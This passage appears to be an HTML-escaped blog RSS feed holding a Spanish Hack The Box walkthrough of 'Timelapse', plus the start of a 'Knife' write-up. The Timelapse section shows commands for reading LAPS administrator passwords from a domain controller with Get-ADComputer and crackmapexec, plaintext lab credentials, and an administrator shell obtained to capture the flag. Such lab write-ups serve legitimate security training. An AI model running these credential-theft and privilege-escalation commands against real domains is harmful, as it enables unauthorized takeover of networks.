&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt; &lt;span class=&#34;n&#34;&gt;π&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;~/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timelapse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shares&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;❯&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;svc_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rb&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;whoami&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;timelapse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;svc_deploy&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd
&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Path&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;svc_deploy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;


&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Enumeramos la información del usuario svc_deploy vemos que pertenece al grupo LAPS_Readers el cual podría estar relacionado al archivo de instalación de SMB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; whoami /all

USER INFORMATION
----------------

User Name            &lt;span class=&#34;nv&#34;&gt;SID&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;====================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;============================================&lt;/span&gt;
timelapse&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc_deploy S-1-5-21-671920749-559770252-3318990721-3103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          &lt;span class=&#34;nv&#34;&gt;Attributes&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;============================================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==================================================&lt;/span&gt;
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;re-Windows &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;APS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    &lt;span class=&#34;nv&#34;&gt;State&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=======&lt;/span&gt;
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Enabled

whoami : ERROR: Unable to get user claims information.
At line:1 char:1
+ whoami /all
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ERROR: Unable t...ms information.:String&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;, RemoteException
    + FullyQualifiedErrorId : NativeCommandError

PS C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;laps&#34;&gt;LAPS&lt;/h2&gt;
&lt;p&gt;Tras investigar un poco, encontramos un &lt;a href=&#34;https://secframe.com/blog/2020/ad_overlooked_acl/#move--laps-escalation&#34;&gt;post relacionado a LAPS&lt;/a&gt; donde se muestra un escenario en el que un usuario sin permisos de administracion pero con permisos de lectura en LAPS puede leer la contraseña de un usuario administrador local. Tras ejecutar el comando mostrado vemos la contraseña de la computadora DC01.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;PS &amp;gt; Get-ADComputer dc01 -Properties ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime, canonicalname


CanonicalName               : timelapse.htb/Domain Controllers/DC01
DistinguishedName           : &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DC01,OU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;timelapse,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-mcs-AdmPwd               : 6i4pJlu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-6B1n&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;132tD+3t+5                           &amp;lt;------
ms-mcs-AdmPwdExpirationTime : &lt;span class=&#34;m&#34;&gt;132956035317974980&lt;/span&gt;
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :



PS &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;De igual forma utilizando crackmapexec con el modulo laps es posible obtener la contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ crackmapexec ldap timelapse.htb -u svc_deploy -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;E3R$Q62^12p7PLlC%KWaxuaV&amp;#39;&lt;/span&gt; –kdcHost timelapse.htb -M laps
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
LDAP        timelapse.htb   &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; timelapse.htb&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc_deploy:E3R&lt;span class=&#34;nv&#34;&gt;$Q62&lt;/span&gt;^12p7PLlC%KWaxuaV
LAPS        timelapse.htb   &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting LAPS Passwords
LAPS        timelapse.htb   &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC01             Computer: DC01$                Password: 6i4pJlu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-6B1n&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;132tD+3t+5
 π ~/htb/timelapse ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell-1&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Observamos que las credenciales nos permiten acceder a todos los recursos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ crackmapexec smb timelapse.htb -u administrator -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;6i4pJlu)-6B1n(132tD+3t+5&amp;#39;&lt;/span&gt; --shares
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; timelapse.htb&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator:6i4pJlu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-6B1n&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;132tD+3t+5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             Share           Permissions     Remark
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             -----           -----------     ------
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             C$              READ,WRITE      Default share
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             IPC$            READ            Remote IPC
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             NETLOGON        READ,WRITE      Logon server share
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             Shares          READ,WRITE
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             SYSVOL          READ            Logon server share
 π ~/htb/timelapse ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos nuevamente un script en ruby con las credenciales del usuario administrator, logrando obtener una shell y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt; π ~/htb/timelapse/shares/cert ❯ ruby admin_shell.rb
PS &amp;gt; whoami
timelapse&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator
PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;

Path
----
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments

PS &amp;gt; dir ..&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
PS &amp;gt; dir ..&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;
    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers

Mode                LastWriteTime         Length Name                                                                                                                                   
----                -------------         ------ ----                                                                                                                                   
d-----       10/23/2021  11:27 AM                Administrator                                                                                                                          
d-----       10/25/2021   8:22 AM                legacyy                                                                                                                                
d-r---       10/23/2021  11:27 AM                Public                                                                                                                                 
d-----       10/25/2021  12:23 PM                svc_deploy                                                                                                                             
d-----        2/23/2022   5:45 PM                TRX                                                                                                                                    

PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;RX&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
PS &amp;gt; dir

    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;RX&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name                                                                                                                                   
----                -------------         ------ ----                                                                                                                                   
-ar---        4/23/2022  12:12 AM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt                                                                                                                               

PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; root.txt
3a2f63973573a40d5ae3185f8a110257
PS &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/timelapse/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/timelapse/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>kerbrute</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>john</category>
            
          
            
              <category>winrm</category>
            
          
            
              <category>ruby</category>
            
          
            
              <category>winpeas</category>
            
          
            
              <category>LAPS</category>
            
          
            
              <category>openssl</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Knife</title>
        <link>https://sckull.github.io/posts/knife/</link>
        <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 27 Aug 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/knife/</guid>
        <description>Knife es una maquina de HackTheBox, en esta maquina encontramos que esta utilizando una version en desarrollo de PHP la cual fue afectada con un backdoor, por medio de este logramos ingresar tras ejecutar una shell inversa.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/knife/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Knife es una maquina de HackTheBox, en esta maquina encontramos que esta utilizando una version en desarrollo de PHP la cual fue afectada con un backdoor, por medio de este  logramos ingresar tras ejecutar una shell inversa. Finalmente escalamos privilegios utilizando los permisos de la herramienta Knife con un script en ruby.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
